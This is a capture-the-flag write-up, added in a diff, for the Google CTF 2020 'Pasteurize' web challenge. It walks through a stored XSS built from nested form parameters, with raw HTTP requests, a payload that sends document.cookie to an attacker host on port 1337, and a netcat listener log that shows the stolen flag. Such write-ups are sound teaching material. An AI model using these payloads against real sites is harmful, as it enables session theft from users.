@@ -1,0 +1,493 @@
+<h1>Google Capture The Flag 2020 – PASTEURIZE</h1>
+
+<ul>
+<li><strong>Category:</strong> web</li>
+<li><strong>Points:</strong> 50</li>
+</ul>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>This doesn't look secure. I wouldn't put even the littlest secret in here. My source tells me that third parties might have implanted it with their little treats already. Can you prove me right?</p>
+  
+  <p>https://pasteurize.web.ctfcompetition.com/</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>Connecting to the website and analyzing the HTML you can find a link to the <a href="pasteurize.js">source code</a>.</p>
+
+<p><code>html
+&lt;a href="/source" style="display:none"&gt;Source&lt;/a&gt;
+</code></p>
+
+<p>So connecting to <code>https://pasteurize.web.ctfcompetition.com/source</code> will reveal the following.</p>
+
+<p>```javascript
+const express = require('express');
+const bodyParser = require('body-parser');
+const utils = require('./utils');
+const Recaptcha = require('express-recaptcha').RecaptchaV3;
+const uuidv4 = require('uuid').v4;
+const Datastore = require('@google-cloud/datastore').Datastore;</p>
+
+<p>/* Just reCAPTCHA stuff. */
+const CAPTCHA<em>SITE</em>KEY = process.env.CAPTCHA<em>SITE</em>KEY || 'site-key';
+const CAPTCHA<em>SECRET</em>KEY = process.env.CAPTCHA<em>SECRET</em>KEY || 'secret-key';
+console.log("Captcha(%s, %s)", CAPTCHA<em>SECRET</em>KEY, CAPTCHA<em>SITE</em>KEY);
+const recaptcha = new Recaptcha(CAPTCHA<em>SITE</em>KEY, CAPTCHA<em>SECRET</em>KEY, {
+  'hl': 'en',
+  callback: 'captcha_cb'
+});</p>
+
+<p>/* Choo Choo! */
+const app = express();
+app.set('view engine', 'ejs');
+app.set('strict routing', true);
+app.use(utils.domains_mw);
+app.use('/static', express.static('static', {
+  etag: true,
+  maxAge: 300 * 1000,
+}));</p>
+
+<p>/* They say reCAPTCHA needs those. But does it? */
+app.use(bodyParser.urlencoded({
+  extended: true
+}));</p>
+
+<p>/* Just a datastore. I would be surprised if it's fragile. */
+class Database {
+  constructor() {
+    this.<em>db = new Datastore({
+      namespace: 'littlethings'
+    });
+  }
+  add</em>note(note<em>id, content) {
+    const note = {
+      note</em>id: note<em>id,
+      owner: 'guest',
+      content: content,
+      public: 1,
+      created: Date.now()
+    }
+    return this.</em>db.save({
+      key: this.<em>db.key(['Note', note</em>id]),
+      data: note,
+      excludeFromIndexes: ['content']
+    });
+  }
+  async get<em>note(note</em>id) {
+    const key = this.<em>db.key(['Note', note</em>id]);
+    let note;
+    try {
+      note = await this._db.get(key);
+    } catch (e) {
+      console.error(e);
+      return null;
+    }
+    if (!note || note.length &lt; 1) {
+      return null;
+    }
+    note = note[0];
+    if (note === undefined || note.public !== 1) {
+      return null;
+    }
+    return note;
+  }
+}</p>
+
+<p>const DB = new Database();</p>
+
+<p>/* Who wants a slice? */
+const escape_string = unsafe =&gt; JSON.stringify(unsafe).slice(1, -1)
+  .replace(/</g, '\x3C').replace(/>/g, '\x3E');</p>
+
+<p>/* o/ */
+app.get('/', (req, res) =&gt; {
+  res.render('index');
+});</p>
+
+<p>/* \o/ [x] */
+app.post('/', async (req, res) =&gt; {
+  const note = req.body.content;
+  if (!note) {
+    return res.status(500).send("Nothing to add");
+  }
+  if (note.length &gt; 2000) {
+    res.status(500);
+    return res.send("The note is too big");
+  }</p>
+
+<p>const note<em>id = uuidv4();
+  try {
+    const result = await DB.add</em>note(note_id, note);
+    if (!result) {
+      res.status(500);
+      console.error(result);
+      return res.send("Something went wrong...");
+    }
+  } catch (err) {
+    res.status(500);
+    console.error(err);
+    return res.send("Something went wrong...");
+  }
+  await utils.sleep(500);
+  return res.redirect(<code>/${note_id}</code>);
+});</p>
+
+<p>/* Make sure to properly escape the note! */
+app.get('/:id([a-f0-9-]{36})', recaptcha.middleware.render, utils.cache<em>mw, async (req, res) =&gt; {
+  const note</em>id = req.params.id;
+  const note = await DB.get<em>note(note</em>id);</p>
+
+<p>if (note == null) {
+    return res.status(404).send("Paste not found or access has been denied.");
+  }</p>
+
+<p>const unsafe<em>content = note.content;
+  const safe</em>content = escape<em>string(unsafe</em>content);</p>
+
+<p>res.render('note<em>public', {
+    content: safe</em>content,
+    id: note_id,
+    captcha: res.recaptcha
+  });
+});</p>
+
+<p>/* Share your pastes with TJMike🎤 */
+app.post('/report/:id([a-f0-9-]{36})', recaptcha.middleware.verify, (req, res) =&gt; {
+  const id = req.params.id;</p>
+
+<p>/* No robots please! */
+  if (req.recaptcha.error) {
+    console.error(req.recaptcha.error);
+    return res.redirect(<code>/${id}?msg=Something+wrong+with+Captcha+:(</code>);
+  }</p>
+
+<p>/* Make TJMike visit the paste */
+  utils.visit(id, req);</p>
+
+<p>res.redirect(<code>/${id}?msg=TJMike🎤+will+appreciate+your+paste+shortly.</code>);
+});</p>
+
+<p>/* This is my source I was telling you about! */
+app.get('/source', (req, res) =&gt; {
+  res.set("Content-type", "text/plain; charset=utf-8");
+  res.sendFile(__filename);
+});</p>
+
+<p>/* Let it begin! */
+const PORT = process.env.PORT || 8080;</p>
+
+<p>app.listen(PORT, () =&gt; {
+  console.log(<code>App listening on port ${PORT}</code>);
+  console.log('Press Ctrl+C to quit.');
+});</p>
+
+<p>module.exports = app;
+```</p>
+
+<p>The service is similar to <a href="https://pastebin.com/">Pastebin</a>, you can create a message that will be stored with an ID and then you can share it with <em>TJMike</em>. Analyzing the page of a created message, e.g. <code>https://pasteurize.web.ctfcompetition.com/512e9209-ac7f-452f-bce9-34c6f780cc6b</code>, you can find an interesting comment.</p>
+
+<p>```html
+<!DOCTYPE html>
+<html></p>
+
+<p><head>
+    <link href="/static/styles/style.css" rel="stylesheet">
+    <link rel="stylesheet" href="/static/styles/bootstrap.css">
+    <script src="/static/scripts/dompurify.js"></script>
+    <script src="/static/scripts/captcha.js"></script>
+</head></p>
+
+<p><body>
+    <nav class="navbar navbar-expand-md navbar-light bg-light">
+    <div class="collapse navbar-collapse mr-auto">
+        <a href="/" class="navbar-brand">Pasteurize</a>
+    </div></p>
+
+</nav>
+
+<pre><code>&lt;div class=container&gt;
+    &lt;div class="container pt-5 w-75"&gt;
+
+        &lt;div class=card&gt;
+            &lt;div class="card-header"&gt;
+                &lt;a id="note-title" class="card-title"&gt;&lt;/a&gt;
+            &lt;/div&gt;
+            &lt;div class="card-body"&gt;
+                &lt;div id="note-content"&gt;&lt;/div&gt;
+            &lt;/div&gt;
+
+
+            &lt;ul class="list-group list-group-flush"&gt;
+                &lt;li class="list-group-item p-0"&gt;
+                    &lt;form action="/report/512e9209-ac7f-452f-bce9-34c6f780cc6b" method="POST" class="form row"&gt;
+                        &lt;script src="//www.google.com/recaptcha/api.js?render=6LfHar0ZAAAAAHBf5Hl4KFZK0dsF8gPxZUsoj5mt&amp;hl=en"&gt;&lt;/script&gt;&lt;script&gt;grecaptcha.ready(function(){grecaptcha.execute('6LfHar0ZAAAAAHBf5Hl4KFZK0dsF8gPxZUsoj5mt', {action: 'homepage'}).then(captcha_cb);});&lt;/script&gt;
+                        &lt;button type="submit" class="btn btn-link col-md-6 border-right"&gt;share with TJMike🎤&lt;/button&gt;
+                        &lt;button type="button" id=back class="btn btn-link col-md-6"&gt;back&lt;/button&gt;
+                    &lt;/form&gt;
+                &lt;/li&gt;
+            &lt;/ul&gt;
+
+        &lt;/div&gt;
+        &lt;br&gt;
+        &lt;div id="alert-container" class="card"&gt;
+            &lt;div id="alert" class="card-body"&gt;&lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;!-- TODO: Fix b/1337 in /source that could lead to XSS --&gt;
+
+&lt;script&gt;
+    const note = "asd qwert 123";
+    const note_id = "512e9209-ac7f-452f-bce9-34c6f780cc6b";
+    const note_el = document.getElementById('note-content');
+    const note_url_el = document.getElementById('note-title');
+    const clean = DOMPurify.sanitize(note);
+    note_el.innerHTML = clean;
+    note_url_el.href = `/${note_id}`;
+    note_url_el.innerHTML = `${note_id}`;
+&lt;/script&gt;
+
+&lt;script&gt;
+    const msg = (new URL(location)).searchParams.get('msg');
+    const back = document.getElementById('back');
+    const alert_div = document.getElementById('alert');
+    const alert_container = document.getElementById('alert-container');
+    back.onclick = () =&gt; history.back();
+    if (msg) {
+        alert_div.innerText = msg;
+        alert_container.style.display = "block";
+        setTimeout(() =&gt; {
+            alert_container.style.display = "none";
+        }, 4000);
+    }
+&lt;/script&gt;
+
+<p></code></pre>
+</body></p>
+
+<p></html>
+```</p>
+
+<p>So the exploitation process should involve the creation of a Stored XSS that must be shared with <em>TJMike</em> in order to exfiltrate session cookies.</p>
+
+<p>An interesting snippet can be here, where the <code>escape_string</code> method is called.</p>
+
+<p>```javascript
+/* Make sure to properly escape the note! */
+app.get('/:id([a-f0-9-]{36})', recaptcha.middleware.render, utils.cache<em>mw, async (req, res) =&gt; {
+  const note</em>id = req.params.id;
+  const note = await DB.get<em>note(note</em>id);</p>
+
+<p>if (note == null) {
+    return res.status(404).send("Paste not found or access has been denied.");
+  }</p>
+
+<p>const unsafe<em>content = note.content;
+  const safe</em>content = escape<em>string(unsafe</em>content);</p>
+
+<p>res.render('note<em>public', {
+    content: safe</em>content,
+    id: note_id,
+    captcha: res.recaptcha
+  });
+});
+```</p>
+
+<p>The method definition is the following.</p>
+
+<p><code>javascript
+/* Who wants a slice? */
+const escape_string = unsafe =&gt; JSON.stringify(unsafe).slice(1, -1)
+  .replace(/&lt;/g, '\\x3C').replace(/&gt;/g, '\\x3E');
+</code></p>
+
+<p>The content of the note is reflected here in the source code, then inserted into the HTML.</p>
+
+<p><code>html
+    &lt;script&gt;
+        const note = "asd qwert 123";
+        const note_id = "512e9209-ac7f-452f-bce9-34c6f780cc6b";
+        const note_el = document.getElementById('note-content');
+        const note_url_el = document.getElementById('note-title');
+        const clean = DOMPurify.sanitize(note);
+        note_el.innerHTML = clean;
+        note_url_el.href = `/${note_id}`;
+        note_url_el.innerHTML = `${note_id}`;
+    &lt;/script&gt;
+</code></p>
+
+<p>In the HTML is inserted after the <code>DOMPurify.sanitize</code> method, so the XSS must be triggered before.</p>
+
+<p>Using double quotes to try to close the constant, i.e. <code>"; alert(); "</code>, will fail.</p>
+
+<p><code>html
+    &lt;script&gt;
+        const note = "\"; alert(); \"";
+        const note_id = "0021ca75-bd21-4fab-8b0a-63c565119611";
+        const note_el = document.getElementById('note-content');
+        const note_url_el = document.getElementById('note-title');
+        const clean = DOMPurify.sanitize(note);
+        note_el.innerHTML = clean;
+        note_url_el.href = `/${note_id}`;
+        note_url_el.innerHTML = `${note_id}`;
+    &lt;/script&gt;
+</code></p>
+
+<p>Trying to escape their escape, i.e. <code>\";alert();//</code>, will not work.</p>
+
+<p><code>html
+    &lt;script&gt;
+        const note = "\\\";alert();//";
+        const note_id = "2ee33611-6108-4ec0-92dd-cc948e2b7aa6";
+        const note_el = document.getElementById('note-content');
+        const note_url_el = document.getElementById('note-title');
+        const clean = DOMPurify.sanitize(note);
+        note_el.innerHTML = clean;
+        note_url_el.href = `/${note_id}`;
+        note_url_el.innerHTML = `${note_id}`;
+    &lt;/script&gt;
+</code></p>
+
+<p>The presence of the following snippet means that you can POST "nested object", because <code>extended</code> is <code>true</code>.</p>
+
+<p><code>javascript
+/* They say reCAPTCHA needs those. But does it? */
+app.use(bodyParser.urlencoded({
+  extended: true
+}));
+</code></p>
+
+<p>So a request like the following can be crafted.</p>
+
+<p>```
+POST / HTTP/1.1
+Host: pasteurize.web.ctfcompetition.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 16
+Origin: https://pasteurize.web.ctfcompetition.com
+Connection: close
+Referer: https://pasteurize.web.ctfcompetition.com/
+Upgrade-Insecure-Requests: 1</p>
+
+<p>content[foo]=aaa
+```</p>
+
+<p>The result produced will be the following.</p>
+
+<p><code>html
+    &lt;script&gt;
+        const note = ""foo":"aaa"";
+        const note_id = "58866002-84e1-42c4-b7fe-82e58a527b6a";
+        const note_el = document.getElementById('note-content');
+        const note_url_el = document.getElementById('note-title');
+        const clean = DOMPurify.sanitize(note);
+        note_el.innerHTML = clean;
+        note_url_el.href = `/${note_id}`;
+        note_url_el.innerHTML = `${note_id}`;
+    &lt;/script&gt;
+</code></p>
+
+<p>So the JavaScript <code>const</code> can be altered, closing the string and inserting arbitrary JavaScript.</p>
+
+<p>A working XSS can be obtained with the following payload.</p>
+
+<p>```
+POST / HTTP/1.1
+Host: pasteurize.web.ctfcompetition.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 24
+Origin: https://pasteurize.web.ctfcompetition.com
+Connection: close
+Referer: https://pasteurize.web.ctfcompetition.com/
+Upgrade-Insecure-Requests: 1</p>
+
+<p>content[;alert();//]=pwn
+```</p>
+
+<p>The result will be the following.</p>
+
+<p><code>html
+    &lt;script&gt;
+        const note = "";alert();//":"pwn"";
+        const note_id = "837822b4-0fc7-4137-ae64-c0881c6164fb";
+        const note_el = document.getElementById('note-content');
+        const note_url_el = document.getElementById('note-title');
+        const clean = DOMPurify.sanitize(note);
+        note_el.innerHTML = clean;
+        note_url_el.href = `/${note_id}`;
+        note_url_el.innerHTML = `${note_id}`;
+    &lt;/script&gt;
+</code></p>
+
+<p>At this point it is sufficient to have a listening host with <code>nc -lkv 1337</code>.</p>
+
+<p>A request like the following can be crafted.</p>
+
+<p>```
+POST / HTTP/1.1
+Host: pasteurize.web.ctfcompetition.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+Origin: https://pasteurize.web.ctfcompetition.com
+Connection: close
+Referer: https://pasteurize.web.ctfcompetition.com/
+Upgrade-Insecure-Requests: 1</p>
+
+<p>content[;document.location='http://x.x.x.x:1337?c='%2Bdocument.cookie;//]=pwn
+```</p>
+
+<p>The result will be the following. </p>
+
+<p><code>
+    &lt;script&gt;
+        const note = "";document.location='http://x.x.x.x:1337?c='+document.cookie;//":"pwn"";
+        const note_id = "32049c5d-b00d-46a8-bb5f-b600d4f46e39";
+        const note_el = document.getElementById('note-content');
+        const note_url_el = document.getElementById('note-title');
+        const clean = DOMPurify.sanitize(note);
+        note_el.innerHTML = clean;
+        note_url_el.href = `/${note_id}`;
+        note_url_el.innerHTML = `${note_id}`;
+    &lt;/script&gt;
+</code></p>
+
+<p>To bypass problems with reCAPTCHA, it is sufficient to create another note and to change the HTML source, in order to signal it to TJMike passing the previous, malicious, <code>note_id</code>.</p>
+
+<p><code>
+user@host:~$ nc -lkv 1337
+Listening on [0.0.0.0] (family 0, port 1337)
+Connection from 51.55.155.104.bc.googleusercontent.com 38470 received!
+GET /?c=secret=CTF{Express_t0_Tr0ubl3s} HTTP/1.1
+Pragma: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Host: 52.47.121.145:1337
+Via: 1.1 infra-squid (squid/3.5.27)
+X-Forwarded-For: 35.233.52.193
+Cache-Control: no-cache
+Connection: keep-alive
+</code></p>
+
+<p>The flag is the following.</p>
+
+<p><code>
+CTF{Express_t0_Tr0ubl3s}
+</code></p>
